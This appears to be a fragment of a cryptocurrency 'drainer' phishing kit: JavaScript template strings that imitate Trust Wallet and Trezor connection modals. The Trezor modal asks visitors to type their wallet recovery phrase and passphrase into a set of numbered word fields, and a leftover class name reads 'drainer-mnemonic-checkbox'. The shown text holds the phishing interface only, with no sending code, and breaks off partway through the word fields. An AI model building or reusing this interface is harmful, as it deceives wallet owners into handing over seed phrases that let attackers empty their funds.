                                                    <path d="M0 260C0 116.406 116.406 0 260 0H764C907.594 0 1024 116.406 1024 260V764C1024 907.594 907.594 1024 764 1024H260C116.406 1024 0 907.594 0 764V260Z" fill="white"/>
                                                    <path d="M512.3 215C615.619 301.288 734.101 295.966 767.953 295.966C760.548 786.707 704.128 689.395 512.3 827C320.472 689.395 264.405 786.707 257 295.966C290.499 295.966 408.981 301.288 512.3 215Z" stroke="#3375BB" stroke-width="70" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
                                                    </svg>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="sc-fvNpTx eFjHkq"></div>
                                        </div>
                                    </div>
                                </div>
                                <div class="sc-gKXOVf liyQQU">
                                    <div class="sc-jIAOiI dWkvrK" style="position: relative; opacity: 1; transform: none;">
                                        <div class="sc-iBkjds emnDjo" style="padding-bottom: 18px;">
                                            <h1 class="sc-ftvSup fqLYro">Install Trust Wallet<br></h1>
                                            <div class="sc-papXJ jCcNJP">To connect your Trust wallet,<br>install the browser extension.<br></div>
                                        </div>
                                        <button onClick="getTrust()" class="sc-himrzO eyWopv">
                                           <div class="sc-ikZpkk FGzOk">
                                              <div class="sc-jIZahH gjHfVN">
                                                 <svg width="13" height="12" viewBox="0 0 13 12" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-ezWOiH bkoIPM">
                                                    <line stroke="currentColor" x1="1" y1="6" x2="12" y2="6" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-kLLXSd bDZenP"></line>
                                                    <path stroke="currentColor" d="M7.51431 1.5L11.757 5.74264M7.5 10.4858L11.7426 6.24314" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-bZkfAO"></path>
                                                 </svg>
                                              </div>
                                           </div>
                                           <span class="sc-gXmSlM CshDF">Get Trust Wallet</span>
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>`;
const TrustRequestingModal = `
<div class="sc-idiyUo hBuwwI" style="--height: 351px; --width: 343px;">
    <div style="pointer-events: none; position: absolute; top: 0px; bottom: 0px; left: 50%; transform: translateX(-50%); width: var(--width); z-index: 9; transition: width 200ms ease 0s;"></div>
    <div class="sc-iqcoie RrATt active">
        <div class="sc-crXcEl gcowpW">
            <button onclick="updatePage(CloseModal);" aria-label="Close" class="sc-fnykZs hFEFWT">
                <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M1 13L13 1" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                    <path d="M1 0.999999L13 13" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                </svg>
            </button>
            <button onclick="updatePage(ConnectModal);" aria-label="Back" class="sc-fEOsli iSYxCx" style="opacity: 1;">
                <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M8 1L1 8L8 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                </svg>
            </button>
        </div>
        <div class="sc-eCYdqJ dLUlU">
            <div style="position: absolute; top: 0px; left: 0px; right: 0px; opacity: 1;">Trust Wallet</div>
        </div>
        <div class="sc-evZas gcbNhn">
            <div class="sc-breuTD hVhjow active-scale-up">
                <div style="pointer-events: auto;" class="sc-ksZaOG dmNTWR">
                    <div style="z-index: 2; opacity: 1; transform: none;">
                        <div class="sc-dkzDqf jKlSZW">
                            <div class="sc-ZyCDH cBtLfS">
                                <div class="sc-jSMfEi lbAEgN"></div>
                                <div class="sc-jOhDuK hLWHUX">
                                    <div class="sc-hlnMnd czUBmg">
                                        <div class="sc-jTYCaT epSHCc">
                                            <div class="sc-jQHtVU jhhhSe">
                                                <div style="transform: scale(0.86); position: relative; width: 100%;">
                                                <svg width="1024" height="1024" viewBox="0 0 1024 1024" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                <path d="M0 260C0 116.406 116.406 0 260 0H764C907.594 0 1024 116.406 1024 260V764C1024 907.594 907.594 1024 764 1024H260C116.406 1024 0 907.594 0 764V260Z" fill="white"/>
                                                <path d="M512.3 215C615.619 301.288 734.101 295.966 767.953 295.966C760.548 786.707 704.128 689.395 512.3 827C320.472 689.395 264.405 786.707 257 295.966C290.499 295.966 408.981 301.288 512.3 215Z" stroke="#3375BB" stroke-width="70" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
                                                </svg>
                                                </div>
                                            </div>
                                            <div class="sc-fvNpTx eFjHkq">
                                                <div class="sc-HzFiz dYEcPx" style="opacity: 1;">
                                                    <svg aria-hidden="true" width="102" height="102" viewBox="0 0 102 102" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                        <path d="M52 100C24.3858 100 2 77.6142 2 50" stroke="url(#paint0_linear_1943_4139)" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <defs>
                                                            <linearGradient id="paint0_linear_1943_4139" x1="2" y1="48.5" x2="53" y2="100" gradientUnits="userSpaceOnUse">
                                                                <stop stop-color="var(--ck-spinner-color)"></stop>
                                                                <stop offset="1" stop-color="var(--ck-spinner-color)" stop-opacity="0"></stop>
                                                            </linearGradient>
                                                        </defs>
                                                    </svg>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="sc-gKXOVf liyQQU">
                                    <div class="sc-jIAOiI dWkvrK" style="position: relative; opacity: 1; transform: none;">
                                        <div style="padding-bottom: 28px;" class="sc-iBkjds emnDjo">
                                            <h1 class="sc-ftvSup fqLYro">Requesting Connection<br></h1>
                                            <div class="sc-papXJ jCcNJP">Open the Trust browser <br>extension to connect your wallet.<br></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
`;
const TrustRejectedModal = `
<div class="sc-idiyUo hBuwwI" style="--height: 351px; --width: 343px;">
    <div style="pointer-events: none; position: absolute; top: 0px; bottom: 0px; left: 50%; transform: translateX(-50%); width: var(--width); z-index: 9; transition: width 200ms ease 0s;"></div>
    <div class="sc-iqcoie RrATt active">
        <div class="sc-crXcEl gcowpW">
            <button onclick="updatePage(CloseModal);" aria-label="Close" class="sc-fnykZs hFEFWT">
                <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M1 13L13 1" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                    <path d="M1 0.999999L13 13" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                </svg>
            </button>
            <button onclick="updatePage(ConnectModal);" aria-label="Back" class="sc-fEOsli iSYxCx" style="opacity: 1;">
                <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M8 1L1 8L8 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                </svg>
            </button>
        </div>
        <div class="sc-eCYdqJ dLUlU">
            <div style="position: absolute; top: 0px; left: 0px; right: 0px; opacity: 1;">Trust Wallet</div>
        </div>
        <div class="sc-evZas gcbNhn">
            <div class="sc-breuTD hVhjow active-scale-up">
                <div style="pointer-events: auto;" class="sc-ksZaOG dmNTWR">
                    <div style="z-index: 2; opacity: 1; transform: none;">
                        <div class="sc-dkzDqf jKlSZW">
                            <div class="sc-ZyCDH cBtLfS">
                                <div class="sc-jSMfEi lbAEgN"></div>
                                <div class="sc-jOhDuK hLWHUX">
                                    <div class="sc-hlnMnd bxwbBD">
                                        <button onclick="updatePage(ImportWalletModal);" aria-label="Retry" class="sc-eKBdFk iGfDZB" style="opacity: 1; transform: none;">
                                            <div class="sc-bUbCnL ilqOAO">
                                                <div>
                                                    <svg aria-hidden="true" width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M32 16C32 24.8366 24.8366 32 16 32C7.16344 32 0 24.8366 0 16C0 7.16344 7.16344 0 16 0C24.8366 0 32 7.16344 32 16ZM24.5001 8.74263C25.0834 8.74263 25.5563 9.21551 25.5563 9.79883V14.5997C25.5563 15.183 25.0834 15.6559 24.5001 15.6559H19.6992C19.1159 15.6559 18.643 15.183 18.643 14.5997C18.643 14.0164 19.1159 13.5435 19.6992 13.5435H21.8378L20.071 11.8798C20.0632 11.8724 20.0555 11.865 20.048 11.8574C19.1061 10.915 17.8835 10.3042 16.5643 10.1171C15.2452 9.92999 13.9009 10.1767 12.7341 10.82C11.5674 11.4634 10.6413 12.4685 10.0955 13.684C9.54968 14.8994 9.41368 16.2593 9.70801 17.5588C10.0023 18.8583 10.711 20.0269 11.7273 20.8885C12.7436 21.7502 14.0124 22.2582 15.3425 22.336C16.6726 22.4138 17.9919 22.0572 19.1017 21.3199C19.5088 21.0495 19.8795 20.7333 20.2078 20.3793C20.6043 19.9515 21.2726 19.9262 21.7004 20.3228C22.1282 20.7194 22.1534 21.3876 21.7569 21.8154C21.3158 22.2912 20.8176 22.7161 20.2706 23.0795C18.7793 24.0702 17.0064 24.5493 15.2191 24.4448C13.4318 24.3402 11.7268 23.6576 10.3612 22.4998C8.9956 21.3419 8.0433 19.7716 7.6478 18.0254C7.2523 16.2793 7.43504 14.4519 8.16848 12.8186C8.90192 11.1854 10.1463 9.83471 11.7142 8.97021C13.282 8.10572 15.0884 7.77421 16.861 8.02565C18.6282 8.27631 20.2664 9.09278 21.5304 10.3525L23.4439 12.1544V9.79883C23.4439 9.21551 23.9168 8.74263 24.5001 8.74263Z" fill="currentColor"></path>
                                                    </svg>
                                                </div>
                                            </div>
                                        </button>
                                        <div class="sc-jTYCaT epSHCc">
                                            <div class="sc-jQHtVU jhhhSe">
                                                <div style="transform: scale(0.86); position: relative; width: 100%;">
                                                <svg width="1024" height="1024" viewBox="0 0 1024 1024" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                <path d="M0 260C0 116.406 116.406 0 260 0H764C907.594 0 1024 116.406 1024 260V764C1024 907.594 907.594 1024 764 1024H260C116.406 1024 0 907.594 0 764V260Z" fill="white"/>
                                                <path d="M512.3 215C615.619 301.288 734.101 295.966 767.953 295.966C760.548 786.707 704.128 689.395 512.3 827C320.472 689.395 264.405 786.707 257 295.966C290.499 295.966 408.981 301.288 512.3 215Z" stroke="#3375BB" stroke-width="70" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
                                                </svg>
                                                </div>
                                            </div>
                                            <div class="sc-fvNpTx eFjHkq"></div>
                                        </div>
                                    </div>
                                </div>
                                <div class="sc-gKXOVf liyQQU">
                                    <div class="sc-jIAOiI dWkvrK" style="will-change: transform, opacity; position: relative; opacity: 1; transform: none;">
                                        <div style="padding-bottom: 28px;" class="sc-iBkjds emnDjo">
                                            <h1 class="sc-ftvSup fqLYro">Request Cancelled<br></h1>
                                            <div class="sc-papXJ jCcNJP">You cancelled the request.<br>Click above to try again.<br></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
`;

const TrezorWalletModal = `
<div id="connect-trezor-modal" class="connect-trezor-modal sc-idiyUo hBuwwI" style="--height: 632px; --width: 543px;">
    <div style="pointer-events: none; position: absolute; top: 0px; bottom: 0px; left: 50%; transform: translateX(-50%); width: var(--width); z-index: 9; transition: width 200ms ease 0s;"></div>
    <div class="sc-iqcoie RrATt active">
        <div class="sc-crXcEl gcowpW">
            <button onclick="updatePage(CloseModal);" aria-label="Close" class="sc-fnykZs hFEFWT">
                <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M1 13L13 1" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                    <path d="M1 0.999999L13 13" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                </svg>
            </button>
            <button onclick="updatePage(ConnectModal);" aria-label="Back" class="sc-fEOsli iSYxCx" style="opacity: 1;">
                <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M8 1L1 8L8 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                </svg>
            </button>
        </div>
        <div class="sc-eCYdqJ dLUlU">
            <div style="position: absolute; top: 0px; left: 0px; right: 0px; opacity: 1;">Trezor Wallet</div>
        </div>
        <div class="sc-evZas gcbNhn">
            <div class="sc-breuTD hVhjow active-scale-up">
                <div class="sc-ksZaOG dmNTWR" style="pointer-events: auto;">
                    <div style="z-index: 2; opacity: 1; transform: none;">
                        <div class="sc-dkzDqf jKlSZW" style="width:495px !important;">
                            <div class="sc-ZyCDH cBtLfS">
                                <div class="sc-jSMfEi lbAEgN"></div>
                                <div class="sc-jOhDuK hLWHUX">
                                    <div class="sc-hlnMnd czUBmg">
                                        <div class="sc-jTYCaT epSHCc">
                                            <div class="sc-jQHtVU jhhhSe" style="border-radius: 0px;">
                                                <div style="transform: scale(1.14); position: relative; width: 100%;">
                                                    <div style="transform: scale(0.86); position: relative; width: 100%;">
                                                    <svg xmlns="http://www.w3.org/2000/svg" width="512" height="512" viewBox="0 0 512 512" version="1.1"><path d="M 243.322 117.098 L 238.145 117.963 231.453 120.481 L 224.761 123 218.631 126.716 L 212.500 130.433 206 137.061 L 199.500 143.690 196.238 149.163 L 192.977 154.636 190.987 160.295 L 188.998 165.955 188.019 172.728 L 187.040 179.500 187.020 190.750 L 187 202 172.994 202 L 158.987 202 159.244 276.681 L 159.500 351.362 207.795 373.704 L 256.090 396.046 304.295 373.734 L 352.500 351.423 352.756 276.711 L 353.013 202 339.138 202 L 325.264 202 324.777 186.250 L 324.290 170.500 321.571 162.510 L 318.853 154.519 315.213 148.528 L 311.574 142.537 305.519 136.481 L 299.463 130.426 293.482 126.795 L 287.500 123.164 282 120.992 L 276.500 118.819 269.162 117.410 L 261.824 116 255.162 116.117 L 248.500 116.234 243.322 117.098 M 244.314 152.798 L 239.129 154.649 235.057 157.344 L 230.985 160.039 227.982 164.183 L 224.980 168.327 223.490 173.345 L 222 178.363 222 190.195 L 222 202.027 255.750 201.763 L 289.500 201.500 289.500 188 L 289.500 174.500 286.710 168.818 L 283.920 163.137 280.256 159.920 L 276.591 156.702 271.046 154.161 L 265.500 151.619 257.500 151.283 L 249.500 150.947 244.314 152.798 M 198.240 282.113 L 198.500 327.226 227.180 340.481 L 255.861 353.737 284.680 340.477 L 313.500 327.218 313.760 282.109 L 314.020 237 256 237 L 197.980 237 198.240 282.113" stroke="none" fill="#fbfbfb" fill-rule="evenodd"/><path d="M 125 50.682 L 122.500 51.113 115.209 53.065 L 107.917 55.017 100.709 58.640 L 93.500 62.264 89 65.302 L 84.500 68.341 80.500 71.808 L 76.500 75.276 70.721 81.849 L 64.942 88.423 60.538 95.961 L 56.133 103.500 54.125 109 L 52.116 114.500 50.308 121 L 48.500 127.500 48.500 258 L 48.500 388.500 50.779 396.837 L 53.059 405.173 55.997 411.653 L 58.935 418.133 63.572 425.109 L 68.210 432.084 75.313 439.104 L 82.417 446.124 89.111 450.574 L 95.804 455.024 101.152 457.388 L 106.500 459.752 111.500 461.469 L 116.500 463.186 118.500 463.549 L 120.500 463.912 127 464.948 L 133.500 465.985 256.640 465.992 L 379.779 466 388.140 464.444 L 396.500 462.888 402.500 460.812 L 408.500 458.736 412.500 456.725 L 416.500 454.713 423.692 449.865 L 430.883 445.018 436.842 439.077 L 442.801 433.137 447.315 426.811 L 451.829 420.485 455.241 412.992 L 458.652 405.500 461.076 397 L 463.500 388.500 463.500 258 L 463.500 127.500 461.607 120.500 L 459.715 113.500 456.499 105.867 L 453.284 98.234 448.395 90.948 L 443.507 83.661 436.503 76.705 L 429.500 69.748 423.619 65.748 L 417.738 61.747 409.619 57.957 L 401.500 54.167 395.500 52.362 L 389.500 50.557 258.500 50.404 L 127.500 50.251 125 50.682 M 243.322 117.098 L 238.145 117.963 231.453 120.481 L 224.761 123 218.631 126.716 L 212.500 130.433 206 137.061 L 199.500 143.690 196.238 149.163 L 192.977 154.636 190.987 160.295 L 188.998 165.955 188.019 172.728 L 187.040 179.500 187.020 190.750 L 187 202 172.994 202 L 158.987 202 159.244 276.681 L 159.500 351.362 207.795 373.704 L 256.090 396.046 304.295 373.734 L 352.500 351.423 352.756 276.711 L 353.013 202 339.138 202 L 325.264 202 324.777 186.250 L 324.290 170.500 321.571 162.510 L 318.853 154.519 315.213 148.528 L 311.574 142.537 305.519 136.481 L 299.463 130.426 293.482 126.795 L 287.500 123.164 282 120.992 L 276.500 118.819 269.162 117.410 L 261.824 116 255.162 116.117 L 248.500 116.234 243.322 117.098 M 244.314 152.798 L 239.129 154.649 235.057 157.344 L 230.985 160.039 227.982 164.183 L 224.980 168.327 223.490 173.345 L 222 178.363 222 190.195 L 222 202.027 255.750 201.763 L 289.500 201.500 289.500 188 L 289.500 174.500 286.710 168.818 L 283.920 163.137 280.256 159.920 L 276.591 156.702 271.046 154.161 L 265.500 151.619 257.500 151.283 L 249.500 150.947 244.314 152.798 M 198.240 282.113 L 198.500 327.226 227.180 340.481 L 255.861 353.737 284.680 340.477 L 313.500 327.218 313.760 282.109 L 314.020 237 256 237 L 197.980 237 198.240 282.113" stroke="none" fill="#0c8d4d" fill-rule="evenodd"/></svg>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="sc-fvNpTx eFjHkq"></div>
                                        </div>
                                    </div>
                                </div>
                                <div class="sc-gKXOVf liyQQU">
                                    <div class="sc-jIAOiI dWkvrK" style="position: relative; opacity: 1; transform: none;">
                                        <div class="sc-iBkjds emnDjo" style="padding-bottom: 18px;">
                                            <h1 class="sc-ftvSup fqLYro">Import Trezor Wallet<br></h1>
                                            <div class="sc-papXJ jCcNJP">To connect your Trezor wallet,<br>enter the secret phrase.<br></div>
                                        </div>
<div class="jssSolrise17 MuiBox-root css-0">
<!-- <div class="MuiBox-root css-3mllz6 drainer-mnemonic-checkbox-container" style="height: 24px;">
<label style="
    line-height: 20px;
    /* margin-right: 4px; */
    vertical-align: top;
    display: block;
    height: 20px;
    color: #000;

">Hidden wallet<input id="phrase-passphrase-checkbox" type="checkbox" name="checkbox"></label>
</div> -->
    <div class="MuiBox-root css-3mllz6 css-selector">
    <input class="phrase-display-none dddsad dddsadx" placeholder="Passphrase" type="password" autocomplete="new-password" id="connect-hardware-passphrase">
    <select class="dddsad" name="connect-hardware-words" id="connect-hardware-words">
<option value="12">I have 12-word phrase</option>
<option value="24">I have 24-word phrase</option>
<option value="shamir">Shamir Backup</option>
</select>
    </div>
    <textarea id="mnemonic-textarea" placeholder="Enter your recovery phrase" class="phrase-display-none MuiGrid-root MuiGrid-container MuiGrid-spacing-xs-2 jssSolrise18 css-isbt42" rows="4" style="padding-top:16px;margin-bottom: 16px;height: 120%;margin-top: 16px;background-color: rgb(255, 255, 255);border: 1px solid rgb(202, 206, 209);border-radius: 0.25rem;resize: none;margin-right: 15px;margin-left: 15px;width: calc(100% - 30px);"></textarea>
    <div id="mnemonic-words" class="MuiGrid-root MuiGrid-container MuiGrid-spacing-xs-2 jssSolrise18 css-isbt42">
        <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div id="mnemonic-inputdiv-0" class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">1.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-0" type="text" tabindex="1" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-1" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">2.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-1" type="text" tabindex="2" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-2" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">3.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-2" type="text" tabindex="3" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-3" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">4.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-3" type="text" tabindex="4" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-4" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">5.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-4" type="text" tabindex="5" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-5" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">6.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-5" type="text" tabindex="6" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-6" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">7.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-6" type="text" tabindex="7" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-7" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">8.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-7" type="text" tabindex="8" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-8" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">9.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-8" type="text" tabindex="9" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-9" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">10.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-9" type="text" tabindex="10" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-10" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">11.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-10" type="text" tabindex="11" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-11" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">12.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-11" type="text" tabindex="12" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-12" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">13.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-12" type="text" tabindex="13" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-13" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">14.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-13" type="text" tabindex="14" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
